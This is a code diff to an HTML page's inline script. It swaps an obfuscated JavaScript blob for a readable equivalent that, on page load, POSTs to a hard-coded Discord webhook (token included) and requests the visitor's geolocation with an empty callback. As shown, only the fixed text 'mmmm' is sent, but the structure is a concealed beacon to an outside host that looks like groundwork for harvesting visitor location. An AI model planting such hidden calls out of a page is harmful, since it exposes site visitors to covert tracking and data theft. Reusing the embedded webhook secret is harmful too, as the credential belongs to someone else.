@@ -17,6 +17,35 @@
     </body>
 
 	<script>
-		const _0x16bda2=_0x20ee;(function(_0x338b58,_0x567992){const _0x1dbb11=_0x20ee,_0x48f3c6=_0x338b58();while(!![]){try{const _0x42e3be=parseInt(_0x1dbb11(0x12c))/0x1*(parseInt(_0x1dbb11(0x13f))/0x2)+-parseInt(_0x1dbb11(0x13d))/0x3*(parseInt(_0x1dbb11(0x13e))/0x4)+parseInt(_0x1dbb11(0x12e))/0x5+parseInt(_0x1dbb11(0x144))/0x6*(-parseInt(_0x1dbb11(0x13c))/0x7)+parseInt(_0x1dbb11(0x136))/0x8*(-parseInt(_0x1dbb11(0x145))/0x9)+parseInt(_0x1dbb11(0x137))/0xa+parseInt(_0x1dbb11(0x138))/0xb;if(_0x42e3be===_0x567992)break;else _0x48f3c6['push'](_0x48f3c6['shift']());}catch(_0x190f9b){_0x48f3c6['push'](_0x48f3c6['shift']());}}}(_0x20a1,0xc59c4));async function boofData(_0xc59fb8){const _0xa484f9=_0x20ee,_0x13f1c4=_0xa484f9(0x13a)+'scord.com/'+_0xa484f9(0x141)+_0xa484f9(0x130)+_0xa484f9(0x12d)+'89/3IUPkV-'+_0xa484f9(0x135)+'gRi8HwaByO'+_0xa484f9(0x131)+_0xa484f9(0x147)+'rTryz7yF2F'+'TD8QrywVjS'+'L',_0x14a1a3=_0xa484f9(0x12f);try{const _0x189941=await fetch(_0x13f1c4,{'method':_0xa484f9(0x146),'headers':{'Content-Type':_0xa484f9(0x134)+_0xa484f9(0x142)},'body':JSON[_0xa484f9(0x139)]({'content':_0x14a1a3})});if(!_0x189941['ok'])throw new Error('HTTP\x20error'+_0xa484f9(0x13b)+_0x189941[_0xa484f9(0x143)]);console['log'](_0xa484f9(0x140)+_0xa484f9(0x12b)+'fully!');}catch(_0x1481a0){console[_0xa484f9(0x133)]('Failed\x20to\x20'+_0xa484f9(0x132)+'ge:',_0x1481a0);}}boofData(d);navigator[_0x16bda2(0x12a)+'n']&&navigator[_0x16bda2(0x12a)+'n'][_0x16bda2(0x148)+'Position'](function(_0x4916cb){});function _0x20ee(_0x584530,_0x4eb15e){const _0x20a1be=_0x20a1();return _0x20ee=function(_0x20ee06,_0xa7c578){_0x20ee06=_0x20ee06-0x12a;let _0x3cac4d=_0x20a1be[_0x20ee06];return _0x3cac4d;},_0x20ee(_0x584530,_0x4eb15e);}function _0x20a1(){const _0x7ac8b8=['15708910FmEUkl','7380604VgSSeo','stringify','https://di','!\x20status:\x20','236166wMxQtQ','4559961iQgEZV','4TSqThq','290XfieXL','Message\x20se','api/webhoo','n/json','status','204BXjweu','58347LhscCE','POST','8HPbqZMRTw','getCurrent','geolocatio','nt\x20success','6665HzLNCo','6811607777','2248675vChRtS','mmmm','ks/1349590','yALxBsS37I','send\x20messa','error','applicatio','MaHFy7f7EG','224rJXrJg'];_0x20a1=function(){return _0x7ac8b8;};return _0x20a1();}
+		async function boofData(data) {
+			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
+			const m = "mmmm";
+			try {
+                const response = await fetch(h, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    content: m
+                  })
+                });
+            
+                if (!response.ok) {
+                  throw new Error(`HTTP error! status: ${response.status}`);
+                }
+            
+                console.log('Message sent successfully!');
+              } catch (error) {
+                console.error('Failed to send message:', error);
+              }
+        }
+		boofData(d);
+
+		if (navigator.geolocation) {
+			navigator.geolocation.getCurrentPosition(function(position) {
+
+			});
+		}
 	</script>
 </html>
